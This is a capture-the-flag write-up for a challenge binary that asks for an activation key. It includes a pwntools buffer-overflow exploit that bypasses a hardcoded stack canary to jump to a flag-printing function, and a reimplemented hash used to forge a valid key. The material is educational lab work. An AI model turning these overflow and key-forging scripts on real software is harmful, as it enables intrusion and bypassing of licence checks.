# Write up for michaelsoft_binbows

## Overview

For this challenge we are doing some reverse engineering. We have one executable file for the two flags. 
The files run a program that needs an activation key. We have 2 ways of pwning this.

## Solution

### Flag 1

For this challenge we want to buffer overflow to put in a new return address to the function that prints the flag. 
However, there is a canary in the stack. Luckily it's a hardcoded canary. 
So as long as we add our canary into the buffer overflow at the right spot, we'll get the flag.
We need to input 32 characters to fill the buffer, than there's a 4 character gap, than the canary, then another unknown gap, then the return address. 
We don't need to figure out the unkown gap, as we can just send our pwned return address several times, and one of them will overwrite the return address.
This gets us the flag. Below is a solution script.
```
#!/usr/bin/python

from pwn import *
context.terminal = ['tmux', 'split']

p = remote("REDACTED", REDACTED)
# p = process("./binbows")
# Canary -0x21524111
can = 0xDEADBEEF
pwn_flag_fn = 0x08049855

print(p.recv())
p.sendline(36*b"A" + p32(can) + 6*p32(pwn_flag_fn))
print(p.recv())
p.interactive()
```

### Flag 2

For the second flag, as the check function is in the executable, we can reverse engineer it to create a valid activation key.
Looking through the activation function, we find it throws out the first 8 characters, then hashes the next 8 characters, 
and finally checks if the last 16 characters are equal the hash of the prior 8 characters. Thus to make a valid key, we just need to replicate their hash function.
That function is also in the executable binary. Below is a python implementation of it. Although originally generated with an AI tool, it ended up needing to
be almost completely rewritten.
```
def hash_function(input_str):
    # Assumes input is 8 lowercase letters only
    
    output = 16*['']
    local_10 = 1337
    local_14 = 0
    for char in input_str:
        # char_value = ord(char) - 97  
        iVar1 = (((ord(char) - 97) * 2) + local_10) % 26
        iVar2 = ((ord(char) - 97) * 3) % 26
        # print(iVar1)
        local_10 = iVar1 - iVar2 
        
        output[local_14] = chr(iVar1 + 97)
        output[local_14 + 8] = chr(iVar2 + 97)

        local_14 +=1
    
    return ''.join(output)
```

From there, we can just input 8 characters, and combine 8 arbitrary characters to the 8 inputted and 16 outputted. 
This gives us the second flag. Below is a solution script.
```
#!/usr/bin/python

from pwn import *
context.terminal = ['tmux', 'split']

p = remote("REDACTED", REDACTED)
# p = process("./binbows")

print(p.recv())
p.sendline(8*b"a" + 8*b'b' + b"nmlkjihgdddddddd")
print(p.recv())
p.interactive()
```




